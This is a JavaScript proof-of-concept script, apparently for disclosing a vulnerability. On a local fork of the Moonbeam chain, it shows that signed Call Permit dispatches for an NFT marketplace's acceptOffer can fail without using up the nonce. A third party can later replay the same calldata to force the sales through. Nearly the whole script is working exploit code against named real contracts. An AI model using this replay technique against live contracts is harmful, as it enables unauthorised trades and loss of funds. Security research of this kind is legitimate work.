const { ApiPromise, WsProvider } = require('@polkadot/api');
const { ethers } = require('ethers');
const fs = require('fs');

const WS = process.env.CHOPSTICKS_WS || 'ws://127.0.0.1:8016';

const CALL_PERMIT = '0x000000000000000000000000000000000000080a';
const MARKETPLACE = '0x683724817a7d526d6256Aec0D6f8ddF541b924de';
const WGLMR = '0xAcc15dC74880C9944775448304B263D191c6077F';
const COLLECTION = '0x104b904e19fBDa76bb864731A2C9E01E6b41f855';
const TOKEN_IDS = [1549n, 1551n, 1552n, 1553n];

const SELLER_PK = '0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce036f41c7a0049b1f0f9f2';
const BUYER_PK = '0x6c8759f02b1c63628923e93e8e3e669c65d78b91607b2d87086d87c0e2f92655';
const REPLAY_DISPATCHER_PK = '0x59c6995e998f97a5a0044966f094538b85957f5e66ea0d824a528e118d5f43a0';
const ADMIN_PK = '0xdbda1821b80551c95e00c373828cae4ac7af2a2a5ddc65076d64ff3c0e65f7a8';

const FUND = 10n ** 22n;
const PRICE = 100n * 10n ** 18n;
const TOTAL_PRICE = PRICE * BigInt(TOKEN_IDS.length);

const CP = new ethers.Interface([
  'function dispatch(address from,address to,uint256 value,bytes data,uint64 gaslimit,uint256 deadline,uint8 v,bytes32 r,bytes32 s)',
  'function nonces(address owner) view returns(uint256)',
]);
const MP = new ethers.Interface([
  'function owner() view returns(address)',
  'function TOKEN() view returns(address)',
  'function setFeesOn(bool _value)',
  'function setDevFee(uint256 fee)',
  'function setBeanieHolderFee(uint256 fee)',
  'function setBeanBuyBackFee(uint256 fee)',
  'function setDefaultCollectionOwnerFee(uint256 fee)',
  'function setCollectionOwnerFee(address ca,uint256 fee)',
  'function setCollectionTrading(address ca,bool value)',
  'function makeOffer(address ca,uint256 tokenId,uint256 price)',
  'function acceptOffer(address ca,uint256 tokenId,uint256 price,address from,bool escrowedBid)',
  'function getOffers(address ca,uint256 tokenId) view returns(tuple(uint256 price,uint256 timestamp,bool accepted,address buyer,bool escrowed)[])',
]);
const WETH = new ethers.Interface([
  'function deposit() payable',
  'function approve(address guy,uint256 wad) returns(bool)',
  'function balanceOf(address account) view returns(uint256)',
  'function allowance(address owner,address spender) view returns(uint256)',
]);
const ERC721 = new ethers.Interface([
  'function ownerOf(uint256 tokenId) view returns(address)',
  'function balanceOf(address owner) view returns(uint256)',
  'function setApprovalForAll(address operator,bool approved)',
  'function isApprovedForAll(address owner,address operator) view returns(bool)',
]);

const coder = ethers.AbiCoder.defaultAbiCoder();
const u256 = (n) => '0x' + BigInt(n).toString(16).padStart(64, '0');
const addressWord = (addr) => '0x' + '0'.repeat(24) + addr.slice(2).toLowerCase();
const mappingSlotUintAddress = (key, slot) => ethers.keccak256(coder.encode(['uint256', 'uint256'], [key, slot]));
const mappingSlotAddressUint = (addr, slot) => ethers.keccak256(coder.encode(['address', 'uint256'], [addr, slot]));
const rawLegacyV = (raw) => BigInt(ethers.decodeRlp(raw)[6]).toString();

function decodeRevertHex(hex) {
  if (!hex || hex === '0x') return '';
  if (hex.startsWith('0x08c379a0')) {
    try { return coder.decode(['string'], '0x' + hex.slice(10 + 64))[0]; } catch (_) { return hex; }
  }
  return hex;
}
function executedSummary(txResult) {
  return txResult.executed.map((e) => {
    const data = e.human?.data || {};
    return {
      from: data.from,
      to: data.to,
      transactionHash: data.transactionHash,
      exitReason: data.exitReason,
      extraData: data.extraData,
      decodedRevert: decodeRevertHex(data.extraData),
    };
  });
}
async function evmCall(api, from, to, data, value = 0n, gas = 10000000) {
  const result = await api.call.ethereumRuntimeRPCApi.call(from, to, data, value, gas, null, null, null, false, null, null);
  const json = result.toJSON();
  if (!json.ok) throw new Error(JSON.stringify(json));
  return { value: json.ok.value, exitReason: json.ok.exitReason };
}
async function decodeCall(api, to, iface, fn, args = [], from = ethers.ZeroAddress) {
  const out = await evmCall(api, from, to, iface.encodeFunctionData(fn, args));
  return iface.decodeFunctionResult(fn, out.value);
}
async function nonce(api, addr) {
  return (await decodeCall(api, CALL_PERMIT, CP, 'nonces', [addr]))[0];
}
async function accountBasic(api, addr) {
  const j = (await api.call.ethereumRuntimeRPCApi.accountBasic(addr)).toJSON();
  return { balance: BigInt(j.balance), nonce: BigInt(j.nonce) };
}
async function fund(provider, addr, amount = FUND) {
  await provider.send('dev_setStorage', [{ System: { Account: [[[addr], {
    nonce: 0, consumers: 0, providers: 1, sufficients: 0,
    data: { free: amount.toString(), reserved: 0, frozen: 0, flags: 0 },
  }]] } }]);
}
async function setEvmStorage(provider, contract, slot, value) {
  await provider.send('dev_setStorage', [{ EVM: { AccountStorages: [[[contract, slot], value]] } }]);
}
async function sendLegacy(api, wallet, to, data, gasLimit = 5000000n, value = 0n) {
  const basic = await accountBasic(api, wallet.address);
  const raw = await wallet.signTransaction({
    to, data, nonce: basic.nonce, gasPrice: 125000000000n, gasLimit, value, chainId: 1284, type: 0,
  });
  const parsed = ethers.Transaction.from(raw);
  const ethTx = { Legacy: {
    nonce: parsed.nonce, gasPrice: parsed.gasPrice.toString(), gasLimit: parsed.gasLimit.toString(),
    action: { Call: parsed.to }, value: parsed.value.toString(), input: parsed.data,
    signature: { v: rawLegacyV(raw), r: parsed.signature.r, s: parsed.signature.s },
  } };
  const events = [];
  const statusInfo = await new Promise((resolve, reject) => {
    let unsub;
    api.tx.ethereum.transact(ethTx).send((result) => {
      if (result.dispatchError) reject(new Error(result.dispatchError.toString()));
      if (result.status.isInBlock || result.status.isFinalized) {
        for (const { event } of result.events) events.push({ section: event.section, method: event.method, data: event.data.toString(), human: event.toHuman() });
        resolve({ status: result.status.type, blockHash: result.status.asInBlock?.toHex?.() || result.status.toString() });
        if (unsub) unsub();
      }
    }).then((u) => { unsub = u; }).catch(reject);
  });
  return { raw, hash: ethers.keccak256(raw), dataHash: ethers.keccak256(parsed.data), statusInfo, executed: events.filter((e) => e.section === 'ethereum' && e.method === 'Executed'), events };
}
async function signDispatch(signer, message) {
  const domain = { name: 'Call Permit Precompile', version: '1', chainId: 1284, verifyingContract: CALL_PERMIT };
  const types = { CallPermit: [
    { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'value', type: 'uint256' },
    { name: 'data', type: 'bytes' }, { name: 'gaslimit', type: 'uint64' }, { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ] };
  const sig = ethers.Signature.from(await signer.signTypedData(domain, types, message));
  return {
    sig,
    dispatchCalldata: CP.encodeFunctionData('dispatch', [message.from, message.to, message.value, message.data, message.gaslimit, message.deadline, sig.v, sig.r, sig.s]),
  };
}
async function snapshot(api, label, seller, buyer) {
  const ownerByToken = {};
  const offersByToken = {};
  for (const id of TOKEN_IDS) {
    ownerByToken[id.toString()] = (await decodeCall(api, COLLECTION, ERC721, 'ownerOf', [id]))[0];
    offersByToken[id.toString()] = (await decodeCall(api, MARKETPLACE, MP, 'getOffers', [COLLECTION, id]))[0].map((o) => ({
      price: o.price.toString(), accepted: o.accepted, buyer: o.buyer, escrowed: o.escrowed,
    }));
  }
  return {
    label,
    block: (await api.query.system.number()).toString(),
    timestampMs: (await api.query.timestamp.now()).toString(),
    callPermitNonce: (await nonce(api, seller.address)).toString(),
    sellerApprovedForMarketplace: (await decodeCall(api, COLLECTION, ERC721, 'isApprovedForAll', [seller.address, MARKETPLACE]))[0],
    sellerNftBalance: (await decodeCall(api, COLLECTION, ERC721, 'balanceOf', [seller.address]))[0].toString(),
    buyerNftBalance: (await decodeCall(api, COLLECTION, ERC721, 'balanceOf', [buyer.address]))[0].toString(),
    sellerWglmrBalance: (await decodeCall(api, WGLMR, WETH, 'balanceOf', [seller.address]))[0].toString(),
    buyerWglmrBalance: (await decodeCall(api, WGLMR, WETH, 'balanceOf', [buyer.address]))[0].toString(),
    buyerMarketplaceAllowance: (await decodeCall(api, WGLMR, WETH, 'allowance', [buyer.address, MARKETPLACE]))[0].toString(),
    ownerByToken,
    offersByToken,
  };
}

async function main() {
  const provider = new WsProvider(WS);
  const api = await ApiPromise.create({ provider, noInitWarn: true });
  const seller = new ethers.Wallet(SELLER_PK);
  const buyer = new ethers.Wallet(BUYER_PK);
  const replayDispatcher = new ethers.Wallet(REPLAY_DISPATCHER_PK);
  const admin = new ethers.Wallet(ADMIN_PK);

  for (const w of [seller, buyer, replayDispatcher, admin]) await fund(provider, w.address);

  await setEvmStorage(provider, MARKETPLACE, u256(1), addressWord(admin.address));
  for (const id of TOKEN_IDS) await setEvmStorage(provider, COLLECTION, mappingSlotUintAddress(id, 2), addressWord(seller.address));
  await setEvmStorage(provider, COLLECTION, mappingSlotAddressUint(seller.address, 3), u256(TOKEN_IDS.length));

  if ((await decodeCall(api, MARKETPLACE, MP, 'owner'))[0].toLowerCase() !== admin.address.toLowerCase()) throw new Error('owner patch failed');
  if ((await decodeCall(api, MARKETPLACE, MP, 'TOKEN'))[0].toLowerCase() !== WGLMR.toLowerCase()) throw new Error('unexpected token');

  for (const data of [
    MP.encodeFunctionData('setFeesOn', [false]),
    MP.encodeFunctionData('setDevFee', [0]),
    MP.encodeFunctionData('setBeanieHolderFee', [0]),
    MP.encodeFunctionData('setBeanBuyBackFee', [0]),
    MP.encodeFunctionData('setDefaultCollectionOwnerFee', [0]),
    MP.encodeFunctionData('setCollectionOwnerFee', [COLLECTION, 0]),
    MP.encodeFunctionData('setCollectionTrading', [COLLECTION, true]),
  ]) await sendLegacy(api, admin, MARKETPLACE, data, 300000n);

  await sendLegacy(api, seller, WGLMR, WETH.encodeFunctionData('deposit'), 200000n, PRICE);
  await sendLegacy(api, buyer, WGLMR, WETH.encodeFunctionData('deposit'), 200000n, TOTAL_PRICE);
  await sendLegacy(api, buyer, WGLMR, WETH.encodeFunctionData('approve', [MARKETPLACE, TOTAL_PRICE]), 200000n);
  await sendLegacy(api, seller, COLLECTION, ERC721.encodeFunctionData('setApprovalForAll', [MARKETPLACE, true]), 300000n);

  const offerTxs = [];
  for (const id of TOKEN_IDS) offerTxs.push(await sendLegacy(api, buyer, MARKETPLACE, MP.encodeFunctionData('makeOffer', [COLLECTION, id, PRICE]), 800000n));
  const afterOffers = await snapshot(api, 'after all offers and initial approval', seller, buyer);

  const deadline = BigInt(Math.floor(Number(afterOffers.timestampMs) / 1000) + 3600);
  const permits = [];
  for (let i = 0; i < TOKEN_IDS.length; i++) {
    const id = TOKEN_IDS[i];
    const data = MP.encodeFunctionData('acceptOffer', [COLLECTION, id, PRICE, buyer.address, false]);
    const message = { from: seller.address, to: MARKETPLACE, value: 0n, data, gaslimit: 5000000n, nonce: BigInt(i), deadline };
    const signed = await signDispatch(seller, message);
    permits.push({ tokenId: id.toString(), signedNonce: i.toString(), acceptOfferData: data, acceptOfferCalldataHash: ethers.keccak256(data), dispatchCalldata: signed.dispatchCalldata, dispatchCalldataHash: ethers.keccak256(signed.dispatchCalldata), v: signed.sig.v, r: signed.sig.r, s: signed.sig.s });
  }

  const revokeApproval = await sendLegacy(api, seller, COLLECTION, ERC721.encodeFunctionData('setApprovalForAll', [MARKETPLACE, false]), 300000n);
  const beforeFailed = await snapshot(api, 'seller revoked approval / before public failed publishes', seller, buyer);
  const failedPublishes = [];
  for (const permit of permits) {
    const tx = await sendLegacy(api, seller, CALL_PERMIT, permit.dispatchCalldata, 5200000n);
    failedPublishes.push({ tokenId: permit.tokenId, signedNonce: permit.signedNonce, txHash: tx.hash, txInputHash: tx.dataHash, ethereumExecuted: executedSummary(tx), nonceAfter: (await nonce(api, seller.address)).toString() });
  }
  const afterFailed = await snapshot(api, 'after all failed/public dispatch attempts', seller, buyer);

  const restoreApproval = await sendLegacy(api, seller, COLLECTION, ERC721.encodeFunctionData('setApprovalForAll', [MARKETPLACE, true]), 300000n);
  const beforeReplay = await snapshot(api, 'seller restored approval / before mass replay', seller, buyer);
  const replays = [];
  for (const permit of permits) {
    const before = await snapshot(api, `before replay token ${permit.tokenId}`, seller, buyer);
    const tx = await sendLegacy(api, replayDispatcher, CALL_PERMIT, permit.dispatchCalldata, 5200000n);
    const after = await snapshot(api, `after replay token ${permit.tokenId}`, seller, buyer);
    replays.push({ tokenId: permit.tokenId, signedNonce: permit.signedNonce, txHash: tx.hash, txInputHash: tx.dataHash, exactSameCalldataReused: tx.dataHash === permit.dispatchCalldataHash, nonceBefore: before.callPermitNonce, nonceAfter: after.callPermitNonce, ethereumExecuted: executedSummary(tx), sellerPaymentDelta: (BigInt(after.sellerWglmrBalance) - BigInt(before.sellerWglmrBalance)).toString(), buyerPaymentDelta: (BigInt(before.buyerWglmrBalance) - BigInt(after.buyerWglmrBalance)).toString(), nftOwnerAfter: after.ownerByToken[permit.tokenId] });
  }
  const afterReplay = await snapshot(api, 'after mass exact calldata replay', seller, buyer);

  const atomicity = {
    nonceUnchangedAcrossFailedPublishes: beforeFailed.callPermitNonce === '0' && afterFailed.callPermitNonce === '0',
    wglmrRolledBackAcrossFailedPublishes: beforeFailed.sellerWglmrBalance === afterFailed.sellerWglmrBalance && beforeFailed.buyerWglmrBalance === afterFailed.buyerWglmrBalance,
    nftRolledBackAcrossFailedPublishes: TOKEN_IDS.every((id) => afterFailed.ownerByToken[id.toString()].toLowerCase() === seller.address.toLowerCase()),
    offersNotAcceptedAcrossFailedPublishes: TOKEN_IDS.every((id) => afterFailed.offersByToken[id.toString()][0]?.accepted === false),
  };
  const replayOk = replays.every((r, i) => r.exactSameCalldataReused && r.nonceBefore === String(i) && r.nonceAfter === String(i + 1) && r.sellerPaymentDelta === PRICE.toString() && r.buyerPaymentDelta === PRICE.toString() && r.nftOwnerAfter.toLowerCase() === buyer.address.toLowerCase());
  const allOffersAccepted = TOKEN_IDS.every((id) => afterReplay.offersByToken[id.toString()][0]?.accepted === true);
  const ok = Object.values(atomicity).every(Boolean) && replayOk && allOffersAccepted && afterReplay.callPermitNonce === String(TOKEN_IDS.length);

  const result = {
    result: ok ? 'SELLER_CONTROLLED_REPLAY_CRITICAL_SUCCEEDED' : 'SELLER_CONTROLLED_REPLAY_FAILED',
    note: 'Only signed nonce 0 can pass CallPermit validation while nonce is 0 and then revert inside acceptOffer. Nonces 1..N are intentionally public future-nonce failures until prior replay advances the nonce.',
    accounts: { seller: seller.address, buyer: buyer.address, replayDispatcher: replayDispatcher.address, forkAdmin: admin.address },
    contracts: { callPermit: CALL_PERMIT, marketplaceV9: MARKETPLACE, paymentToken: WGLMR, erc721Collection: COLLECTION, tokenIds: TOKEN_IDS.map(String) },
    pricePerToken: PRICE.toString(),
    totalPrice: TOTAL_PRICE.toString(),
    setupTxs: { offerTxs: offerTxs.map((tx, i) => ({ tokenId: TOKEN_IDS[i].toString(), txHash: tx.hash })), sellerRevokeApproval: revokeApproval.hash, sellerRestoreApproval: restoreApproval.hash },
    permits,
    failedPublishes,
    replays,
    atomicity,
    snapshots: { afterOffers, beforeFailed, afterFailed, beforeReplay, afterReplay },
    summary: { finalNonce: afterReplay.callPermitNonce, sellerTotalPayment: (BigInt(afterReplay.sellerWglmrBalance) - BigInt(beforeReplay.sellerWglmrBalance)).toString(), buyerTotalPayment: (BigInt(beforeReplay.buyerWglmrBalance) - BigInt(afterReplay.buyerWglmrBalance)).toString(), allOffersAccepted, replayOk },
  };
  const json = JSON.stringify(result, null, 2);
  if (process.env.RESULT_PATH) fs.writeFileSync(process.env.RESULT_PATH, json, { encoding: 'utf8' });
  console.log(json);
  await api.disconnect();
  if (!ok) process.exitCode = 1;
}

main().catch((err) => { console.error(err); process.exit(1); });
